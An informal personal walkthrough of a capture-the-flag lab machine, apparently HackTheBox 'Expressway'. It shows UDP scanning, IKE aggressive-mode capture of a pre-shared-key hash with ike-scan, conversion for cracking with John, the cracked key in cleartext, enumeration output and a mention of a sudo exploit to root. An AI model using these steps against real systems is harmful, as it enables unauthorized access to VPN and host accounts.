___


just 1 port? ssh?


has to be bruteforce -> hydra right not working lol

what would be the user???

express? expressway, user, adm, admin



fuckkkkk there was a udp port my scan completely didn't catch



*scanning udp ports as well with rustscan*
sudo rustscan --udp -a 10.10.11.87



*used this tool*
sudo ike-scan --aggressive 10.10.11.87


*found user though*
Type=ID_USER_FQDN, Value=ike@expressway.htb


*grabbed hash*
sudo ike-scan -A 10.10.11.87 -Ppsk_crack.txt


*convert to john hash*
python3 ikescan2john.py /home/ew/box/expressway/psk_crack.txt


*cracked PSK*
freakingrockstarontheroad (?)



*sqlite db's*
╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/apt/listchanges-old.db: Berkeley DB (Hash, version 9, little-endian)
Found /var/lib/fail2ban/fail2ban.sqlite3: regular file, no read permission
Found /var/lib/lastlog/lastlog2.db: SQLite 3.x database, last written using SQLite version 3046001, file counter 41, database pages 3, cookie 0x1, schema 4, UTF-8, version-valid-for 41
Found /var/lib/rpm/rpmdb.sqlite: SQLite 3.x database, last written using SQLite version 3040001, writer version 2, read version 2, file counter 2, database pages 53, cookie 0x31, schema 4, UTF-8, version-valid-for 2
Found /var/lib/wtmpdb/wtmp.db: SQLite 3.x database, last written using SQLite version 3046001, file counter 212, database pages 4, cookie 0x1, schema 4, UTF-8, version-valid-for 212



*sudo version is vulnerable ran exploit script then root shell*